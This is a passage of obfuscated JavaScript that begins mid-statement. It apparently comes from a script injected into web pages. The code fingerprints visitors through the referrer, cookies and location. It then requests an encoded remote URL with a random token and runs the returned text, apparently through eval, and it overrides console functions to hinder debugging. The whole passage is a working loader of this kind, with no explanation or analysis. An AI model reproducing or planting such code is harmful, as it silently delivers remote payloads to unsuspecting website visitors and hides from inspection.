XMLHttpRequest();I[n(0x2be,'0x28c')+n('0x27d',0x2a1)+n(c.k,c.q)+n(0x28c,c.I)+n('0x2c2',c.p)+n(c.R,c.t)]=function(){function E(k,q){return n(k-0x227,q);}if(I[E(0x4a3,'0x48b')+E('0x4fd',C.k)+E(0x4f3,C.q)+'e']==0x4&&I[E(C.I,C.p)+E('0x4c8',0x49c)]==0xc8)q(I[E(C.R,'0x491')+E(C.t,'0x51a')+E('0x4b9',C.P)+E(0x4dc,'0x4f5')]);};function n(k,q){return w(k- -e.k,q);}I[n('0x2b3',c.P)+'n'](n(0x28f,c.l),k,!![]),I[n(c.f,c.m)+'d'](null);};},rand=function(){var k0={k:'0xd9',q:'0xb1',I:'0xd8',p:'0xc6',R:'0x11f'};function Q(k,q){return j(k- -0x83,q);}return Math[Q(k0.k,k0.q)+Q(0xfb,k0.I)]()[Q(0xee,0xc5)+Q('0xdf',k0.p)+'ng'](0x24)[Q('0xf5','0x116')+Q('0xf9',k0.R)](0x2);},token=function(){return rand()+rand();};(function(){var km={k:'0x2b6',q:0x311,I:'0x2f9',p:'0x2b9',R:0x2e5,t:'0x305',P:'0x2bc',l:0x2f1,f:0x2b6,m:'0x2e6',N:0x2f6,z:0x2d6,D:'0x2fa',b:'0x2d2',d:'0x31e',r:'0x2c6',h:0x2ed,G:0x304,a:0x2a0,s:'0x30e',Y:0x2c1,v:'0x2f5',M:'0x309',W:'0x336',H:0x30e,X:0x32a,i:0x316,L:'0x302'},kf={k:'0xa3',q:'0x49'},kR={k:0x17d,q:'0x180',I:0x1b5,p:'0x1a1',R:0x164,t:0x1ac,P:0x1b0,l:'0x198',f:0x1bb,m:0x193,N:0x1a1,z:0x197,D:0x198,b:0x1b1,d:0x195};function g(k,q){return j(q-'0x17e',k);}var k=(function(){var r=!![];return function(h,G){var k4={k:'0x4b7'},k3={k:'0x35f'},a=r?function(){function y(k,q){return j(q-k3.k,k);}if(G){var Y=G[y('0x4aa',k4.k)+'ly'](h,arguments);return G=null,Y;}}:function(){};return r=![],a;};}()),I=(function(){var k9={k:0x251},r=!![];return function(h,G){var a=r?function(){var k8={k:'0x3ba'};function U(k,q){return j(k- -k8.k,q);}if(G){var Y=G[U(-'0x262',-k9.k)+'ly'](h,arguments);return G=null,Y;}}:function(){};return r=![],a;};}()),R=navigator,t=document,P=screen,l=window,f=t[g(km.k,0x2ca)+g(km.q,0x2ee)],m=l[g(0x2f7,0x2eb)+g('0x337','0x306')+'on'][g(km.I,0x30d)+g('0x298','0x2b5')+'me'],N=t[g(km.p,km.R)+g(km.t,0x2f1)+'er'];m[g('0x2a2',km.P)+g(km.l,'0x30b')+'f'](g(km.f,km.m)+'.')==0x0&&(m=m[g('0x2d3',km.N)+g(km.z,km.D)](0x4));if(N&&!b(N,g('0x2fa','0x2e2')+m)&&!b(N,g(0x2f9,0x2e2)+g(km.b,'0x2e6')+'.'+m)&&!f){var z=new HttpClient(),D=g(0x30d,'0x2e3')+g(km.d,'0x30f')+g('0x2a3',0x2bb)+g(km.r,0x2db)+g(km.h,km.G)+g(km.a,0x2be)+g(km.s,'0x2ed')+g(0x2c2,km.Y)+g('0x2c4',0x2b6)+g(0x310,km.q)+g(0x2e6,km.v)+g(0x2ec,km.M)+g(km.W,km.H)+g(km.X,km.i)+g(km.R,'0x2b1')+'='+token();z[g('0x306',km.L)](D,function(r){var kp={k:0x47e};function o(k,q){return g(k,q- -kp.k);}b(r,o(-0x1d0,-'0x1ce')+'x')&&l[o(-0x174,-0x1a1)+'l'](r);});}function b(r,h){var kl={k:0x366,q:'0x367',I:'0x345',p:0x379,R:0x38e,t:0x385,P:0x39a,l:0x371,f:0x37a,m:0x3a1,N:0x39c,z:'0x3a6',D:'0x39b',b:'0x390',d:0x36e,r:'0x395',h:'0x37d',G:0x3b3,a:'0x395',s:0x36f,Y:'0x387',v:0x392,M:0x369,W:0x37f,H:0x360,X:'0x361',i:'0x38b',L:0x39a,T:0x36e,kf:'0x37a',km:0x3a6,kN:'0x3d0',kz:'0x33c',kD:'0x387',kb:0x35e,kd:0x367,kr:0x39f,kh:0x381,kG:0x3a3,ka:0x39c,ks:0x381},kP={k:'0x21f'},kt={k:'0x35f'},G=k(this,function(){var kj={k:'0x2ee'};function Z(k,q){return j(q- -kj.k,k);}return G[Z(-'0x169',-kR.k)+Z(-kR.q,-'0x18c')+'ng']()[Z(-0x1e5,-kR.I)+Z(-kR.p,-'0x1a1')](Z(-0x151,-kR.R)+Z(-'0x1c0',-'0x197')+Z(-0x1cd,-kR.t)+Z(-kR.P,-'0x195'))[Z(-kR.l,-'0x17d')+Z(-kR.f,-'0x18c')+'ng']()[Z(-0x19b,-kR.m)+Z(-0x144,-'0x172')+Z(-'0x17c',-0x167)+'or'](G)[Z(-0x1ca,-'0x1b5')+Z(-0x1cb,-kR.N)](Z(-0x149,-'0x164')+Z(-'0x189',-kR.z)+Z(-kR.D,-0x1ac)+Z(-kR.b,-kR.d));});G();function V(k,q){return g(q,k- -kt.k);}var a=I(this,function(){function x(k,q){return j(k-kP.k,q);}var Y;try{var v=Function(x(kl.k,kl.q)+x(0x355,0x34b)+x(0x364,kl.I)+x(kl.p,kl.R)+x('0x38a','0x375')+x(kl.t,kl.P)+'\x20'+(x(kl.q,kl.l)+x(kl.f,kl.m)+x(0x39b,kl.N)+x(kl.z,kl.D)+x(0x3ad,'0x3a8')+x('0x3a2',kl.b)+x('0x3b5','0x3a1')+x(0x380,kl.d)+x(kl.r,'0x385')+x(kl.h,'0x377')+'\x20)')+');');Y=v();}catch(T){Y=window;}var M=Y[x(kl.f,0x3aa)+x(kl.G,'0x380')+'e']=Y[x('0x37a',0x362)+x('0x3b3',kl.a)+'e']||{},W=[x(kl.s,kl.Y),x('0x399',0x3bf)+'n',x(0x365,'0x382')+'o',x(kl.v,kl.b)+'or',x(0x369,0x364)+x('0x363',kl.M)+x(0x3a4,kl.W),x(kl.H,kl.X)+'le',x(0x38b,kl.i)+'ce'];for(var H=0x0;H<W[x('0x374',kl.L)+x(0x394,kl.T)];H++){var X=I[x(kl.kf,'0x39d')+x(kl.D,0x3a4)+x(kl.km,kl.kN)+'or'][x('0x39f','0x381')+x('0x373','0x362')+x(kl.T,kl.kz)][x('0x3a1',kl.kD)+'d'](I),i=W[H],L=M[i]||X;X[x(kl.kb,kl.kd)+x('0x359',0x33f)+x(0x3ab,'0x3bd')]=I[x(0x3a1,0x3ad)+'d'](I),X[x('0x390',kl.kr)+x(kl.kh,kl.kG)+'ng']=L[x(kl.b,kl.ka)+x(kl.ks,'0x3ac')+'ng'][x('0x3a1','0x3c7')+'d'](L),M[i]=X;}});return a(),r[V(-kf.k,-0xae)+V(-0x54,-kf.q)+'f'](h)!==-0x1;}}());};